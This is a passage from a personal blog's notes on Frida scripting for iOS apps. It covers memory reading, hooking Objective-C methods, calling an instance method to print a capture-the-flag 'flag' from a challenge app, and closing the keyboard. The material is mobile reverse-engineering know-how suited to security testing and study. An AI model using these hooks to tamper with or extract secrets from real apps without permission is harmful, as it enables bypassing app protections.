<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">res</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">element</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="k">try</span><span class="p">{</span>
<span class="w">                    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">Memory</span><span class="p">.</span><span class="nx">readUtf8String</span><span class="p">(</span><span class="nx">element</span><span class="p">.</span><span class="nx">address</span><span class="p">));</span><span class="w">    </span>
<span class="w">                </span><span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span>
<span class="w">                    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"[x] Cannot read memory at "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">element</span><span class="p">.</span><span class="nx">address</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"as string"</span><span class="p">)</span>
<span class="w">                </span><span class="p">}</span>

<span class="w">            </span><span class="p">});</span>
<span class="w">        </span><span class="p">}</span>
</code></pre></div>
<p>It's possible to use "?" as placeholder.</p>
<p>Attach to an Objective-C class' instance method:</p>
<div class="highlight"><pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">ObjC</span><span class="p">.</span><span class="nx">available</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">targetClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ObjC</span><span class="p">.</span><span class="nx">classes</span><span class="p">[</span><span class="s1">'&lt;target class&gt;'</span><span class="p">];</span>

<span class="w">    </span><span class="nx">Interceptor</span><span class="p">.</span><span class="nx">attach</span><span class="p">(</span><span class="nx">targetClass</span><span class="p">[</span><span class="s2">"&lt;method signature&gt;"</span><span class="p">].</span><span class="nx">implementation</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">onLeave</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">retval</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="c1">// Do something</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">});</span>
<span class="p">}</span>
</code></pre></div>
<p>Invoke class instance method - iOS:</p>
<div class="highlight"><pre><span></span><code><span class="nx">ObjC</span><span class="p">.</span><span class="nx">choose</span><span class="p">(</span><span class="nx">ObjC</span><span class="p">.</span><span class="nx">classes</span><span class="p">[</span><span class="s1">'Captain_Nohook.ViewController'</span><span class="p">],{</span>
<span class="w">    </span><span class="nx">onMatch</span><span class="o">:</span><span class="w"> </span><span class="p">(</span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"[!]Flag is: "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">instance</span><span class="p">[</span><span class="s1">'- flag'</span><span class="p">]().</span><span class="nx">text</span><span class="p">())</span>
<span class="w">    </span><span class="p">},</span><span class="w"> </span>
<span class="w">    </span><span class="nx">onComplete</span><span class="o">:</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// Do nothing</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">})</span>
</code></pre></div>
<p>Invoke class instance method - Android: https://alyagomaa.github.io/blog/Using-Frida-to-call-unused-android-methods/</p>
<p>For iOS, function arguments start from index 2 and can be processed as follows:</p>
<div class="highlight"><pre><span></span><code><span class="nx">onEnter</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">args</span><span class="p">){</span>
<span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"[&gt;] Arguments: "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">ObjC</span><span class="p">.</span><span class="nb">Object</span><span class="p">(</span><span class="nx">args</span><span class="p">[</span><span class="mf">2</span><span class="p">]));;</span>
<span class="p">},</span>
</code></pre></div>
<p>Initialise a <code>NSString</code> object:</p>
<div class="highlight"><pre><span></span><code><span class="kd">var</span><span class="w"> </span><span class="nx">nsstring</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ObjC</span><span class="p">.</span><span class="nx">classes</span><span class="p">.</span><span class="nx">NSString</span><span class="p">.</span><span class="nx">stringWithString_</span><span class="p">(</span><span class="s2">"rickfromfrida"</span><span class="p">);</span>
</code></pre></div>
<p><code>UIKit</code> code must be ran on the main thread in order to properly work. The following snippet allows to queue function on the main thread queue:</p>
<div class="highlight"><pre><span></span><code><span class="nx">ObjC</span><span class="p">.</span><span class="nx">schedule</span><span class="p">(</span><span class="nx">ObjC</span><span class="p">.</span><span class="nx">mainQueue</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// &lt;-- All UIKit code goes here</span>
<span class="p">});</span>
</code></pre></div>
<p>Close keyboard (globally) - from ChaptGPT:</p>
<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">closeKeyboard</span><span class="p">(){</span>
<span class="w">    </span><span class="nx">ObjC</span><span class="p">.</span><span class="nx">schedule</span><span class="p">(</span><span class="nx">ObjC</span><span class="p">.</span><span class="nx">mainQueue</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">       </span><span class="kd">const</span><span class="w"> </span><span class="nx">app</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ObjC</span><span class="p">.</span><span class="nx">classes</span><span class="p">.</span><span class="nx">UIApplication</span><span class="p">.</span><span class="nx">sharedApplication</span><span class="p">();</span>
<span class="w">       </span><span class="kd">var</span><span class="w"> </span><span class="nx">sel</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ObjC</span><span class="p">.</span><span class="nx">selector</span><span class="p">(</span><span class="s2">"resignFirstResponder"</span><span class="p">);</span>
<span class="w">       </span><span class="c1">// sendAction:to:from:forEvent:</span>
<span class="w">       </span><span class="nx">app</span><span class="p">.</span><span class="nx">sendAction_to_from_forEvent_</span><span class="p">(</span><span class="nx">sel</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w">       </span>
<span class="w">    </span><span class="p">})</span>
<span class="p">}</span>
</code></pre></div>
<p>Close keyboard (globally) invoking <code>- endEditing:YES</code>:</p>
<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">closeKeyboard</span><span class="p">(</span><span class="nx">f</span><span class="o">=</span><span class="kc">null</span><span class="p">){</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">controllers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="nx">ObjC</span><span class="p">.</span><span class="nx">classes</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="nx">f</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">){</span>
<span class="w">        </span><span class="nx">controllers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">controllers</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">x</span><span class="p">=&gt;</span><span class="nx">x</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">f</span><span class="p">));</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="nx">controllers</span><span class="p">.</span><span class="nx">forEach</span><span class="p">((</span><span class="nx">c</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// Get the active instance for that controller, whether it exists</span>
<span class="w">        </span><span class="nx">ObjC</span><span class="p">.</span><span class="nx">choose</span><span class="p">(</span><span class="nx">ObjC</span><span class="p">.</span><span class="nx">classes</span><span class="p">[</span><span class="nx">c</span><span class="p">],{</span>
<span class="w">            </span><span class="nx">onMatch</span><span class="o">:</span><span class="w"> </span><span class="p">(</span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="c1">// use '- endEditing:' for closing the keyboard on the active controller's view</span>
<span class="w">                </span><span class="nx">ObjC</span><span class="p">.</span><span class="nx">schedule</span><span class="p">(</span><span class="nx">ObjC</span><span class="p">.</span><span class="nx">mainQueue</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nx">instance</span><span class="p">.</span><span class="nx">view</span><span class="p">()[</span><span class="s1">'- endEditing:'</span><span class="p">]();</span>
<span class="w">                </span><span class="p">})</span>
<span class="w">            </span><span class="p">},</span><span class="w"> </span>
<span class="w">            </span><span class="nx">onComplete</span><span class="o">:</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="c1">// Do nothing</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">})</span>
<span class="w">    </span><span class="p">})</span>
<span class="p">}</span>
</code></pre></div>
<p>Close keyboard in specific view invoking <code>- endEditing:YES</code>:</p>
<div class="highlight"><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">controller</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ObjC</span><span class="p">.</span><span class="nx">classes</span><span class="p">[</span><span class="s1">'&lt;controller class name&gt;'</span><span class="p">]</span>

<span class="nx">ObjC</span><span class="p">.</span><span class="nx">choose</span><span class="p">(</span><span class="nx">controller</span><span class="p">,{</span>
<span class="w">    </span><span class="nx">onMatch</span><span class="o">:</span><span class="w"> </span><span class="p">(</span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">ObjC</span><span class="p">.</span><span class="nx">schedule</span><span class="p">(</span><span class="nx">ObjC</span><span class="p">.</span><span class="nx">mainQueue</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">instance</span><span class="p">.</span><span class="nx">view</span><span class="p">()[</span><span class="s1">'- endEditing:'</span><span class="p">]()</span>
<span class="w">        </span><span class="p">})</span>
<span class="w">    </span><span class="p">},</span><span class="w"> </span>
<span class="w">    </span><span class="nx">onComplete</span><span class="o">:</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// Do nothing</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">})</span>
</code></pre></div>
  </div>
  <div class="tag-cloud">
    <p>
    </p>
  </div>






</article>

<footer>
<p>&copy; Jack69 - 2025 </p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="https://ojack69.github.io/jacks-corner/theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="dark"
          type="text/javascript">
  </script>
</p></footer>  </main>

<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " Jack's Corner ",
  "url" : "https://ojack69.github.io/jacks-corner",
  "image": "",
  "description": "My personal notes on stuff I like, nothing special"
}
</script>  <script>
    window.loadStorkIndex = function () {
      stork.initialize("https://ojack69.github.io/jacks-corner/theme/stork/stork.wasm")
      stork.register("sitesearch", "https://ojack69.github.io/jacks-corner/search-index.st", { showProgress: false });
    }
  </script>
  <script src="https://ojack69.github.io/jacks-corner/theme/stork/stork.js"></script>

</body>
</html>